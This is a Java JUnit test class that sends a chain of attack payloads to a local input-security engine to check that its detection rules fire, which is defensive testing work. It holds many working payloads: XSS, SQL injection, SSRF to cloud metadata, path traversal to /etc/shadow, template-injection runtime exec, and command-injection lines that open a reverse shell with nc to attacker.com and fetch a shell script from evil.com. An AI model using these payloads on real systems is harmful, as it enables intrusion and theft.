package org.example.input_security_starter;

import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.AfterAll;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@DisplayName("Remote Server Security Test - Attack Chain")
class RemoteServerTest {

    private static final String BASE_URL = System.getProperty("remote.test.base-url", "http://127.0.0.1:9090");
    private static final String LOG_FILE = System.getProperty("remote.test.log-file", "local-attack-results.log");
    private static final String STATS_URL = BASE_URL + "/input-security-api/stats";
    private static final ObjectMapper objectMapper = new ObjectMapper();
    private static final List<Map<String, Object>> attackResults = new ArrayList<>();
    private static final Set<String> ENGINE_RULES = new HashSet<>(Arrays.asList(
            "xss-attack",
            "sql-injection",
            "code-execution",
            "command-injection",
            "ssrf-attack",
            "path-traversal",
            "ldap-injection",
            "xxe-injection",
            "template-injection",
            "deserialization-attack",
            "nosql-injection",
            "installation-attack",
            "c2-communication",
            "actions-on-objectives"
    ));
    private static final Pattern BLOCK_RULE_PATTERN = Pattern.compile(
            "Input blocked by security rule:\\s*([a-zA-Z0-9\\-]+)"
    );
    private static final int STATS_POLL_TIMEOUT_MS = Integer.getInteger("remote.test.stats-timeout-ms", 1600);
    private static final int STATS_POLL_INTERVAL_MS = Integer.getInteger("remote.test.stats-interval-ms", 120);
    private static Integer beforeServerTotalEvents = null;
    private static Integer afterServerTotalEvents = null;
    private static Map<String, Integer> beforeServerRuleCounts = null;
    private static Map<String, Integer> afterServerRuleCounts = null;

    private static final String[] IP_POOL = {
        "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
        "208.67.222.222", "208.67.220.220", "208.67.222.220", "208.67.220.222",
        "9.9.9.9", "149.112.112.112", "64.6.64.6", "64.6.65.6",
        "185.199.108.1", "185.199.109.1", "185.199.110.1", "185.199.111.1",
        "140.82.112.1", "140.82.113.1", "140.82.114.1", "140.82.115.1",
        "8.8.2.2", "8.8.6.6", "1.2.4.4", "1.2.8.8",
        "114.114.114.114", "114.114.115.115", "223.5.5.5", "223.6.6.6",
        "119.29.29.29", "119.28.28.28", "182.254.116.116", "182.254.96.96",
        "180.76.76.76", "61.135.157.8", "106.2.192.1", "218.30.118.6",
        "123.125.115.110", "220.181.57.216", "42.247.8.8", "42.247.9.9",
        "203.198.7.66", "203.198.7.67", "202.175.110.1", "202.14.169.85",
        "200.16.16.1", "200.16.17.1", "45.32.32.1", "45.32.33.1"
    };

    private int currentIpIndex = 0;

    private String getNextIp() {
        String ip = IP_POOL[currentIpIndex];
        currentIpIndex = (currentIpIndex + 1) % IP_POOL.length;
        return ip;
    }

    @BeforeAll
    static void setUp() {
        System.out.println("============================================================");
        System.out.println("       Remote Server Security Test - Attack Chain          ");
        System.out.println("       Target: " + BASE_URL);
        System.out.println("============================================================");
        beforeServerTotalEvents = fetchServerTotalEvents();
        beforeServerRuleCounts = fetchServerRuleCounts();
        if (beforeServerTotalEvents != null) {
            System.out.println("Server totalEvents (before): " + beforeServerTotalEvents);
        } else {
            System.out.println("Server totalEvents (before): unavailable");
        }
        if (beforeServerRuleCounts == null) {
            System.out.println("Server typeDistribution (before): unavailable");
        } else {
            System.out.println("Server typeDistribution (before): loaded");
        }
    }

    @AfterAll
    static void tearDown() throws Exception {
        afterServerTotalEvents = fetchServerTotalEvents();
        afterServerRuleCounts = fetchServerRuleCounts();
        saveAttackResults();
        printAttackSummary();
        enforceEngineRuleCoverage();
    }

    private static void saveAttackResults() throws Exception {
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(LOG_FILE))) {
            for (Map<String, Object> result : attackResults) {
                writer.write(objectMapper.writeValueAsString(result));
                writer.newLine();
            }
        }
        System.out.println("\nResults saved to: " + LOG_FILE);
    }

    private static void printAttackSummary() {
        System.out.println("\n============================================================");
        System.out.println("                   Attack Summary                          ");
        System.out.println("============================================================");

        Map<String, Integer> expectedRuleCounts = new HashMap<>();
        Map<String, Integer> detectedRuleCounts = new HashMap<>();
        int totalCases = attackResults.size();
        int sentRequests = 0;
        int requestErrors = 0;
        int expectedDetectable = 0;
        int blockedByStatus = 0;
        int detectedByStats = 0;
        int matchedTotal = 0;
        int potentialMisses = 0;
        List<String> missCases = new ArrayList<>();

        for (Map<String, Object> result : attackResults) {
            String expectedRule = (String) result.get("expected_rule");
            if (expectedRule != null) {
                expectedRuleCounts.put(expectedRule, expectedRuleCounts.getOrDefault(expectedRule, 0) + 1);
            }

            if (Boolean.TRUE.equals(result.get("request_sent"))) {
                sentRequests++;
            } else {
                requestErrors++;
            }

            if (Boolean.TRUE.equals(result.get("expected_detectable"))) {
                expectedDetectable++;
            }

            if (Boolean.TRUE.equals(result.get("blocked_by_status"))) {
                blockedByStatus++;
            }

            if (Boolean.TRUE.equals(result.get("detected_by_stats"))) {
                detectedByStats++;
            }

            if (Boolean.TRUE.equals(result.get("matched"))) {
                matchedTotal++;
                String detectedRule = (String) result.get("detected_rule");
                if (detectedRule != null) {
                    detectedRuleCounts.put(detectedRule, detectedRuleCounts.getOrDefault(detectedRule, 0) + 1);
                }
            }

            if (Boolean.TRUE.equals(result.get("request_sent"))
                    && Boolean.TRUE.equals(result.get("expected_detectable"))
                    && !Boolean.TRUE.equals(result.get("matched"))) {
                potentialMisses++;
                missCases.add((String) result.get("test_name"));
            }
        }

        System.out.println("\nExpected Rule Statistics (from test input):");
        expectedRuleCounts.forEach((rule, count) -> {
            System.out.println("  - " + rule + ": " + count + " times");
        });

        System.out.println("\nDetected Rule Statistics (403 or stats delta):");
        if (detectedRuleCounts.isEmpty()) {
            System.out.println("  - none");
        } else {
            detectedRuleCounts.forEach((rule, count) ->
                    System.out.println("  - " + rule + ": " + count + " times")
            );
        }

        System.out.println("\nTotal Cases: " + totalCases);
        System.out.println("Requests Sent: " + sentRequests);
        System.out.println("Request Errors: " + requestErrors);
        System.out.println("Expected Detectable (rule + transport): " + expectedDetectable);
        System.out.println("Blocked by 403: " + blockedByStatus + " (" +
                (sentRequests > 0 ? String.format("%.1f", blockedByStatus * 100.0 / sentRequests) : 0) + "%)");
        System.out.println("Detected by Stats Delta: " + detectedByStats);
        System.out.println("Matched Total (403 + stats): " + matchedTotal);
        System.out.println("Potential Misses (sent + expected-detectable but not matched): " + potentialMisses);

        if (!missCases.isEmpty()) {
            System.out.println("Potential Miss Case Examples:");
            int max = Math.min(20, missCases.size());
            for (int i = 0; i < max; i++) {
                System.out.println("  - " + missCases.get(i));
            }
            if (missCases.size() > max) {
                System.out.println("  - ... and " + (missCases.size() - max) + " more");
            }
        }

        if (beforeServerTotalEvents != null && afterServerTotalEvents != null) {
            int delta = afterServerTotalEvents - beforeServerTotalEvents;
            System.out.println("\nServer totalEvents (before -> after): "
                    + beforeServerTotalEvents + " -> " + afterServerTotalEvents + " (delta=" + delta + ")");
        } else {
            System.out.println("\nServer totalEvents delta: unavailable (stats endpoint not reachable)");
        }

        if (beforeServerRuleCounts != null && afterServerRuleCounts != null) {
            System.out.println("\nEngine Rule Coverage (stats delta):");
            List<String> sortedRules = new ArrayList<>(ENGINE_RULES);
            Collections.sort(sortedRules);
            int coveredRules = 0;
            for (String rule : sortedRules) {
                int before = beforeServerRuleCounts.getOrDefault(rule, 0);
                int after = afterServerRuleCounts.getOrDefault(rule, 0);
                int delta = Math.max(0, after - before);
                if (delta > 0) {
                    coveredRules++;
                }
                System.out.println("  - " + rule + ": before=" + before + ", after=" + after + ", delta=" + delta);
            }
            System.out.println("Engine Rules Covered: " + coveredRules + "/" + ENGINE_RULES.size());
        } else {
            System.out.println("\nEngine Rule Coverage: unavailable (stats endpoint not reachable)");
        }
    }

    private static void enforceEngineRuleCoverage() {
        boolean requireAllRules = Boolean.parseBoolean(
                System.getProperty("remote.test.require-all-engine-rules", "true")
        );
        if (!requireAllRules) {
            return;
        }
        if (beforeServerRuleCounts == null || afterServerRuleCounts == null) {
            System.out.println("Skip coverage assertion: stats endpoint unavailable");
            return;
        }

        List<String> uncovered = new ArrayList<>();
        for (String rule : ENGINE_RULES) {
            int before = beforeServerRuleCounts.getOrDefault(rule, 0);
            int after = afterServerRuleCounts.getOrDefault(rule, 0);
            if (after - before <= 0) {
                uncovered.add(rule);
            }
        }

        if (!uncovered.isEmpty()) {
            throw new AssertionError("Engine rules not matched in monitor mode: " + uncovered);
        }
    }

    private Map<String, Object> executeAttack(String testName, String attackType, String rule,
                                               String fullUrl, String method, String body,
                                               Map<String, String> headers) {
        Map<String, Object> result = new LinkedHashMap<>();
        result.put("test_name", testName);
        result.put("attack_type", attackType);
        result.put("expected_rule", rule);
        result.put("ts", System.currentTimeMillis());
        result.put("url", fullUrl);

        HttpURLConnection conn = null;
        try {
            URL url = new URL(fullUrl);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod(method);
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.setDoOutput(body != null);

            Map<String, String> allHeaders = new HashMap<>();
            if (headers != null) {
                allHeaders.putAll(headers);
            }
            allHeaders.put("X-Forwarded-For", getNextIp());
            allHeaders.put("X-Real-IP", getNextIp());
            allHeaders.put("Client-IP", getNextIp());

            boolean expectedDetectable = isExpectedDetectable(rule, allHeaders);
            result.put("expected_detectable", expectedDetectable);
            Integer ruleCountBefore = expectedDetectable ? fetchServerRuleCount(rule) : null;
            result.put("rule_count_before", ruleCountBefore);

            for (Map.Entry<String, String> entry : allHeaders.entrySet()) {
                conn.setRequestProperty(entry.getKey(), entry.getValue());
            }

            if (body != null) {
                OutputStream os = conn.getOutputStream();
                os.write(body.getBytes("UTF-8"));
                os.close();
            }

            int statusCode = conn.getResponseCode();
            String responseBody = "";
            try {
                InputStream is = conn.getInputStream();
                BufferedReader br = new BufferedReader(new InputStreamReader(is, "UTF-8"));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) {
                    sb.append(line);
                }
                br.close();
                responseBody = sb.toString();
            } catch (Exception e) {
                InputStream is = conn.getErrorStream();
                if (is != null) {
                    BufferedReader br = new BufferedReader(new InputStreamReader(is, "UTF-8"));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = br.readLine()) != null) {
                        sb.append(line);
                    }
                    br.close();
                    responseBody = sb.toString();
                }
            }

            result.put("status_code", statusCode);
            result.put("response_length", responseBody.length());
            result.put("response_preview", truncate(responseBody, 160));
            result.put("request_sent", true);

            boolean blockedByStatus = statusCode == 403;
            String detectedRule = extractDetectedRule(responseBody);
            Integer ruleCountAfter = ruleCountBefore;
            boolean hitByStats = false;
            if (expectedDetectable && !blockedByStatus && ruleCountBefore != null) {
                ruleCountAfter = waitForRuleCountIncrease(rule, ruleCountBefore);
                hitByStats = ruleCountAfter != null && ruleCountAfter > ruleCountBefore;
                if (hitByStats && detectedRule == null) {
                    detectedRule = rule;
                }
            }
            boolean matched = blockedByStatus || hitByStats;
            result.put("blocked_by_status", blockedByStatus);
            result.put("detected_by_stats", hitByStats);
            result.put("rule_count_after", ruleCountAfter);
            result.put("matched", matched);
            result.put("detected_rule", detectedRule);

            String summary = matched ? "[MATCHED]" : "[MISS]";
            if (detectedRule != null) {
                System.out.println("[" + summary + "] " + testName + " -> Status: " + statusCode + ", Rule: " + detectedRule);
            } else {
                System.out.println("[" + summary + "] " + testName + " -> Status: " + statusCode);
            }

            attackResults.add(result);
            return result;

        } catch (Exception e) {
            result.put("request_sent", false);
            result.put("blocked_by_status", false);
            result.put("detected_by_stats", false);
            result.put("matched", false);
            result.put("detected_rule", null);
            result.put("expected_detectable", isExpectedDetectable(rule, headers));
            result.put("error", e.getMessage());
            System.out.println("[ERROR] " + testName + ": " + e.getMessage());
            attackResults.add(result);
            return result;
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }
    }

    private static Integer fetchServerTotalEvents() {
        HttpURLConnection conn = null;
        try {
            conn = (HttpURLConnection) new URL(STATS_URL).openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(3000);
            conn.setReadTimeout(3000);
            int code = conn.getResponseCode();
            if (code != 200) {
                return null;
            }

            try (InputStream is = conn.getInputStream()) {
                @SuppressWarnings("unchecked")
                Map<String, Object> data = objectMapper.readValue(is, Map.class);
                Object value = data.get("totalEvents");
                if (value instanceof Number) {
                    return ((Number) value).intValue();
                }
                return null;
            }
        } catch (Exception e) {
            return null;
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }
    }

    private static Map<String, Integer> fetchServerRuleCounts() {
        HttpURLConnection conn = null;
        try {
            conn = (HttpURLConnection) new URL(STATS_URL).openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(3000);
            conn.setReadTimeout(3000);
            int code = conn.getResponseCode();
            if (code != 200) {
                return null;
            }

            try (InputStream is = conn.getInputStream()) {
                @SuppressWarnings("unchecked")
                Map<String, Object> data = objectMapper.readValue(is, Map.class);
                Object distribution = data.get("typeDistribution");
                if (!(distribution instanceof List)) {
                    return new HashMap<>();
                }

                Map<String, Integer> counts = new HashMap<>();
                for (Object itemObj : (List<?>) distribution) {
                    if (!(itemObj instanceof Map)) {
                        continue;
                    }
                    Map<?, ?> item = (Map<?, ?>) itemObj;
                    Object nameObj = item.get("name");
                    Object valueObj = item.get("value");
                    if (nameObj instanceof String && valueObj instanceof Number) {
                        counts.put((String) nameObj, ((Number) valueObj).intValue());
                    }
                }
                return counts;
            }
        } catch (Exception e) {
            return null;
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }
    }

    private static Integer fetchServerRuleCount(String rule) {
        Map<String, Integer> ruleCounts = fetchServerRuleCounts();
        if (ruleCounts == null) {
            return null;
        }
        return ruleCounts.getOrDefault(rule, 0);
    }

    private static Integer waitForRuleCountIncrease(String rule, int beforeCount) {
        int interval = Math.max(20, STATS_POLL_INTERVAL_MS);
        int timeout = Math.max(interval, STATS_POLL_TIMEOUT_MS);
        long deadline = System.currentTimeMillis() + timeout;
        Integer latestCount = beforeCount;

        while (System.currentTimeMillis() <= deadline) {
            Integer currentCount = fetchServerRuleCount(rule);
            if (currentCount != null) {
                latestCount = currentCount;
                if (currentCount > beforeCount) {
                    return currentCount;
                }
            }
            try {
                Thread.sleep(interval);
            } catch (InterruptedException interruptedException) {
                Thread.currentThread().interrupt();
                break;
            }
        }
        return latestCount;
    }

    private static boolean isExpectedDetectable(String rule, Map<String, String> headers) {
        if (!ENGINE_RULES.contains(rule)) {
            return false;
        }
        if (headers != null) {
            String contentType = headers.get("Content-Type");
            if (contentType != null && contentType.toLowerCase(Locale.ROOT).contains("multipart/form-data")) {
                return false;
            }
        }
        return true;
    }

    private static String extractDetectedRule(String responseBody) {
        if (responseBody == null || responseBody.isEmpty()) {
            return null;
        }
        Matcher matcher = BLOCK_RULE_PATTERN.matcher(responseBody);
        if (matcher.find()) {
            return matcher.group(1);
        }

        for (String rule : ENGINE_RULES) {
            if (responseBody.contains(rule)) {
                return rule;
            }
        }
        return null;
    }

    private static String truncate(String value, int maxLen) {
        if (value == null) {
            return "";
        }
        if (value.length() <= maxLen) {
            return value;
        }
        return value.substring(0, maxLen) + "...";
    }

    private Map<String, Object> executeGet(String testName, String attackType, String rule, String url) {
        return executeAttack(testName, attackType, rule, url, "GET", null, null);
    }

    private Map<String, Object> executePost(String testName, String attackType, String rule, String url, String body, String contentType) {
        Map<String, String> headers = new HashMap<>();
        headers.put("Content-Type", contentType);
        return executeAttack(testName, attackType, rule, url, "POST", body, headers);
    }

    // ==================== Reconnaissance - 15 tests ====================

    @Test
    @DisplayName("Reconnaissance - Directory Scan")
    void testReconnaissanceDirectoryScan() {
        String[] paths = {
            "/admin", "/backup", "/config", "/database", "/api/docs",
            "/.git", "/.env", "/wp-admin", "/phpMyAdmin", "/swagger",
            "/api/v1", "/api/v2", "/management", "/actuator", "/health"
        };
        for (String path : paths) {
            executeGet("DirScan-" + path, "reconnaissance", "directory-scan", BASE_URL + path);
        }
    }

    @Test
    @DisplayName("Reconnaissance - Info Disclosure")
    void testReconnaissanceInfoDisclosure() {
        String[] paths = {
            "/api/info", "/config.json", "/phpinfo.php", "/server-status",
            "/actuator/health", "/version", "/readme", "/CHANGELOG",
            "/.aws/credentials", "/.docker/config.json"
        };
        for (String path : paths) {
            executeGet("InfoDisc-" + path, "reconnaissance", "info-disclosure", BASE_URL + path);
        }
    }

    // ==================== Delivery - XSS - 15 tests ====================

    @Test
    @DisplayName("Delivery - XSS Attack - Set 1")
    void testDeliveryXss1() {
        String[] payloads = {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>"
        };
        String[] names = {"SCRIPT_TAG", "IMG_ERROR", "SVG_LOAD", "BODY_LOAD", "INPUT_FOCUS"};
        for (int i = 0; i < payloads.length; i++) {
            try {
                String encodedPayload = URLEncoder.encode(payloads[i], "UTF-8");
                executeGet("XSS1-" + names[i], "delivery", "xss-attack", BASE_URL + "/login?username=" + encodedPayload);
            } catch (Exception e) {
                System.out.println("[ERROR] XSS1: " + e.getMessage());
            }
        }
    }

    @Test
    @DisplayName("Delivery - XSS Attack - Set 2")
    void testDeliveryXss2() {
        String[] payloads = {
            "javascript:alert(document.cookie)",
            "<iframe src=javascript:alert(1)>",
            "<a href=javascript:alert(1)>click</a>",
            "<embed src=javascript:alert(1)>",
            "<object data=javascript:alert(1)>"
        };
        String[] names = {"JS_COOKIE", "IFRAME_SRC", "A_HREF", "EMBED_SRC", "OBJECT_DATA"};
        for (int i = 0; i < payloads.length; i++) {
            try {
                String encodedPayload = URLEncoder.encode(payloads[i], "UTF-8");
                executeGet("XSS2-" + names[i], "delivery", "xss-attack", BASE_URL + "/login?username=" + encodedPayload);
            } catch (Exception e) {
                System.out.println("[ERROR] XSS2: " + e.getMessage());
            }
        }
    }

    @Test
    @DisplayName("Delivery - XSS Attack - Set 3")
    void testDeliveryXss3() {
        String[] payloads = {
            "'-alert(1)-'",
            "\"><script>alert(1)</script>",
            "<img src=\"x\" onerror=\"alert(1)\">",
            "<svg><script>alert(1)</script></svg>",
            "<div onclick=\"alert(1)\">click</div>"
        };
        String[] names = {"QUOTE_DASH", "SCRIPT_QUOTE", "IMG_QUOTE", "SVG_SCRIPT", "DIV_ONCLICK"};
        for (int i = 0; i < payloads.length; i++) {
            try {
                String encodedPayload = URLEncoder.encode(payloads[i], "UTF-8");
                executeGet("XSS3-" + names[i], "delivery", "xss-attack", BASE_URL + "/login?username=" + encodedPayload);
            } catch (Exception e) {
                System.out.println("[ERROR] XSS3: " + e.getMessage());
            }
        }
    }

    // ==================== Delivery - SQL Injection - 15 tests ====================

    @Test
    @DisplayName("Delivery - SQL Injection - Set 1")
    void testDeliverySqlInjection1() {
        String[] payloads = {
            "1' OR '1'='1",
            "1 UNION SELECT NULL--",
            "1'; DROP TABLE users--",
            "admin'--",
            "' OR 1=1 LIMIT 1--"
        };
        String[] names = {"OR_1_1", "UNION_NULL", "DROP_TABLE", "ADMIN_BYPASS", "LIMIT_BYPASS"};
        for (int i = 0; i < payloads.length; i++) {
            try {
                String encodedPayload = URLEncoder.encode(payloads[i], "UTF-8");
                executeGet("SQL1-" + names[i], "delivery", "sql-injection", BASE_URL + "/login?username=" + encodedPayload);
            } catch (Exception e) {
                System.out.println("[ERROR] SQL1: " + e.getMessage());
            }
        }
    }

    @Test
    @DisplayName("Delivery - SQL Injection - Set 2")
    void testDeliverySqlInjection2() {
        String[] payloads = {
            "' UNION SELECT username,password FROM users--",
            "1' ORDER BY 1--",
            "1' ORDER BY 10--",
            "' AND 1=1--",
            "' AND 1=2--"
        };
        String[] names = {"UNION_USERPASS", "ORDER_1", "ORDER_10", "AND_1_1", "AND_1_2"};
        for (int i = 0; i < payloads.length; i++) {
            try {
                String encodedPayload = URLEncoder.encode(payloads[i], "UTF-8");
                executeGet("SQL2-" + names[i], "delivery", "sql-injection", BASE_URL + "/login?username=" + encodedPayload);
            } catch (Exception e) {
                System.out.println("[ERROR] SQL2: " + e.getMessage());
            }
        }
    }

    @Test
    @DisplayName("Delivery - SQL Injection - Set 3")
    void testDeliverySqlInjection3() {
        String[] payloads = {
            "1'; WAITFOR DELAY '0:0:5'--",
            "1' AND SLEEP(5)--",
            "' OR ''='",
            "1' UNION ALL SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--"
        };
        String[] names = {"WAITFOR", "SLEEP", "OR_EMPTY", "UNION_ALL", "UNION_3NULL"};
        for (int i = 0; i < payloads.length; i++) {
            try {
                String encodedPayload = URLEncoder.encode(payloads[i], "UTF-8");
                executeGet("SQL3-" + names[i], "delivery", "sql-injection", BASE_URL + "/login?username=" + encodedPayload);
            } catch (Exception e) {
                System.out.println("[ERROR] SQL3: " + e.getMessage());
            }
        }
    }

    // ==================== Delivery - LDAP/SSRF - 10 tests ====================

    @Test
    @DisplayName("Delivery - LDAP Injection")
    void testDeliveryLdapInjection() {
        String[] payloads = {
            "*)(uid=*))(|(uid=*",
            "admin)(&(password=*)",
            "*)(objectClass=*",
            ")(!(&(objectClass=*",
            "*)(cn=*"
        };
        String[] names = {"WILDCARD_UID", "ADMIN_BIND", "OBJECT_CLASS", "NOT_OBJECT", "CN_WILDCARD"};
        for (int i = 0; i < payloads.length; i++) {
            try {
                String encodedPayload = URLEncoder.encode(payloads[i], "UTF-8");
                executeGet("LDAP-" + names[i], "delivery", "ldap-injection", BASE_URL + "/login?username=" + encodedPayload);
            } catch (Exception e) {
                System.out.println("[ERROR] LDAP: " + e.getMessage());
            }
        }
    }

    @Test
    @DisplayName("Delivery - NoSQL Injection")
    void testDeliveryNosqlInjection() {
        String[] payloads = {
            "{\"$ne\":null}",
            "{\"$where\":\"this.password.length > 0\"}",
            "{\"$regex\":\".*\"}",
            "{\"$gt\":\"\"}",
            "{\"$expr\":{\"$eq\":[1,1]}}"
        };
        String[] names = {"NE_NULL", "WHERE_JS", "REGEX_ANY", "GT_EMPTY", "EXPR_EQ"};
        for (int i = 0; i < payloads.length; i++) {
            try {
                String encodedPayload = URLEncoder.encode(payloads[i], "UTF-8");
                executeGet("NoSQL-" + names[i], "delivery", "nosql-injection", BASE_URL + "/login?username=" + encodedPayload);
            } catch (Exception e) {
                System.out.println("[ERROR] NoSQL: " + e.getMessage());
            }
        }
    }

    @Test
    @DisplayName("Delivery - SSRF Attack")
    void testDeliverySsrf() {
        String[] payloads = {
            "http://169.254.169.254/latest/meta-data",
            "http://metadata.google.internal/computeMetadata/v1/",
            "gopher://127.0.0.1:6379/_INFO",
            "file:///etc/passwd",
            "dict://localhost:11211/stats"
        };
        String[] names = {"AWS_META", "GCP_META", "GOPHER", "FILE", "DICT"};
        for (int i = 0; i < payloads.length; i++) {
            try {
                String encodedPayload = URLEncoder.encode(payloads[i], "UTF-8");
                executeGet("SSRF-" + names[i], "delivery", "ssrf-attack", BASE_URL + "/proxy?url=" + encodedPayload);
            } catch (Exception e) {
                System.out.println("[ERROR] SSRF: " + e.getMessage());
            }
        }
    }

    // ==================== Exploitation - 15 tests ====================

    @Test
    @DisplayName("Exploitation - Path Traversal - Set 1")
    void testExploitationPathTraversal1() {
        String[] payloads = {
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        };
        String[] names = {"DOT_DOT", "BACKSLASH", "DOUBLE_SLASH", "ENCODED", "DOUBLE_ENC"};
        for (int i = 0; i < payloads.length; i++) {
            try {
                String encodedPayload = URLEncoder.encode(payloads[i], "UTF-8");
                executeGet("Path1-" + names[i], "exploitation", "path-traversal", BASE_URL + "/file?path=" + encodedPayload);
            } catch (Exception e) {
                System.out.println("[ERROR] Path1: " + e.getMessage());
            }
        }
    }

    @Test
    @DisplayName("Exploitation - Path Traversal - Set 2")
    void testExploitationPathTraversal2() {
        String[] payloads = {
            "/etc/passwd",
            "....\\/....\\/....\\/etc\\/passwd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "../../../../etc/shadow"
        };
        String[] names = {"ABS_PATH", "ESCAPED_SLASH", "UTF8_OVERLONG", "MIXED_ENC", "SHADOW"};
        for (int i = 0; i < payloads.length; i++) {
            try {
                String encodedPayload = URLEncoder.encode(payloads[i], "UTF-8");
                executeGet("Path2-" + names[i], "exploitation", "path-traversal", BASE_URL + "/file?path=" + encodedPayload);
            } catch (Exception e) {
                System.out.println("[ERROR] Path2: " + e.getMessage());
            }
        }
    }

    @Test
    @DisplayName("Exploitation - XXE Attack")
    void testExploitationXxe() {
        String[] payloads = {
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/evil.dtd\">]><foo>&xxe;</foo>"
        };
        String[] names = {"PASSWD", "SHADOW", "EXTERNAL"};
        for (int i = 0; i < payloads.length; i++) {
            executePost("XXE-" + names[i], "exploitation", "xxe-injection", BASE_URL + "/xml", payloads[i], "application/xml");
        }
    }

    @Test
    @DisplayName("Exploitation - Command Injection")
    void testExploitationCommandInjection() {
        String[] payloads = {
            "; cat /etc/passwd",
            "| whoami",
            "& dir",
            "`id`",
            "$(whoami)",
            "; ls -la",
            "| nc -e /bin/sh attacker.com 1234",
            "; wget http://evil.com/shell.sh -O /tmp/shell.sh"
        };
        String[] names = {"SEMICOLON", "PIPE", "AND_DIR", "BACKTICK", "DOLLAR", "LS_LA", "NC_SHELL", "WGET"};
        for (int i = 0; i < payloads.length; i++) {
            try {
                String encodedPayload = URLEncoder.encode(payloads[i], "UTF-8");
                executeGet("Cmd-" + names[i], "exploitation", "command-injection", BASE_URL + "/exec?cmd=" + encodedPayload);
            } catch (Exception e) {
                System.out.println("[ERROR] Cmd: " + e.getMessage());
            }
        }
    }

    @Test
    @DisplayName("Exploitation - Template Injection")
    void testExploitationTemplateInjection() {
        String[] payloads = {
            "${7*7}",
            "{{7*7}}",
            "#{T(java.lang.Runtime).getRuntime().exec('id')}",
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }",
            "${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')}"
        };
        String[] names = {"EXPR_7X7", "HANDLEBARS", "SPRING_RUNTIME", "FREEMARKER", "GROOVY"};
        for (int i = 0; i < payloads.length; i++) {
            try {
                String encodedPayload = URLEncoder.encode(payloads[i], "UTF-8");
                executeGet("SSTI-" + names[i], "exploitation", "template-injection", BASE_URL + "/template?name=" + encodedPayload);
            } catch (Exception e) {
                System.out.println("[ERROR] SSTI: " + e.getMessage());
            }
        }
    }

    @Test
    @DisplayName("Exploitation - Code Execution")
    void testExploitationCodeExecution() {
        String[] payloads = {
            "eval(alert(1))",
            "system('id')",
            "Class.forName('java.lang.Runtime')",
            "${runtime.exec('id')}",
            "setTimeout(alert(1),1000)"
        };
        String[] names = {"EVAL", "SYSTEM", "CLASS_FORNAME", "RUNTIME_EXEC", "SET_TIMEOUT"};
        for (int i = 0; i < payloads.length; i++) {
            try {
                String encodedPayload = URLEncoder.encode(payloads[i], "UTF-8");
                executeGet("CodeExec-" + names[i], "exploitation", "code-execution", BASE_URL + "/script?expr=" + encodedPayload);
            } catch (Exception e) {
                System.out.println("[ERROR] CodeExec: " + e.getMessage());
            }
        }
    }

    @Test
    @DisplayName("Exploitation - Deserialization Attack")
    void testExploitationDeserialization() {
        String[] payloads = {
            "rO0ABXNyABFqYXZhLnV0aWwuQXJyYXlMaXN0eHAAAAABdwQAAAABdAAEVEVTVHg=",
            "aced0005737200116a6176612e7574696c2e486173684d6170",
            "O:8:\"stdClass\":1:{s:3:\"cmd\";s:2:\"id\";}",
            "!!python/object/apply:os.system ['id']"
        };
        String[] names = {"JAVA_BASE64", "JAVA_MAGIC", "PHP_OBJECT", "PY_OBJECT"};
        for (int i = 0; i < payloads.length; i++) {
            executePost("Deser-" + names[i], "exploitation", "deserialization-attack",
                    BASE_URL + "/deserialize", payloads[i], "text/plain");
        }
    }

    // ==================== Installation - 10 tests ====================

    @Test
    @DisplayName("Installation - File Upload")
    void testInstallationFileUpload() {
        String[] filenames = {
            "shell.php", "shell.jsp", "shell.jspx", "shell.aspx",
            "shell.asp", "test.jpg.php", "test.php3", "test.phtml",
            "shell.php5", "test.php7"
        };

        String[] maliciousFilenames = {
            "shell.php", "shell.jsp", "shell.jspx", "shell.aspx",
            "shell.asp", "test.jpg.php", "test.php3", "test.phtml",
            "shell.php5", "test.php7"
        };

        for (int i = 0; i < filenames.length; i++) {
            String body = "------WebKitFormBoundary\r\n" +
                    "Content-Disposition: form-data; name=\"file\"; filename=\"" + maliciousFilenames[i] + "\"\r\n" +
                    "Content-Type: application/octet-stream\r\n\r\n" +
                    "<malicious_code/>\r\n" +
                    "------WebKitFormBoundary--\r\n";

            executePost("Upload-" + filenames[i], "installation", "installation-attack",
                    BASE_URL + "/upload", body, "multipart/form-data; boundary=----WebKitFormBoundary");
        }
    }

    @Test
    @DisplayName("Installation - Persistence Behavior")
    void testInstallationPersistenceBehavior() {
        String[] payloads = {
            "crontab -e",
            "schtasks /create /tn backdoor",
            "/etc/cron.daily/evil.sh",
            "~/.ssh/authorized_keys",
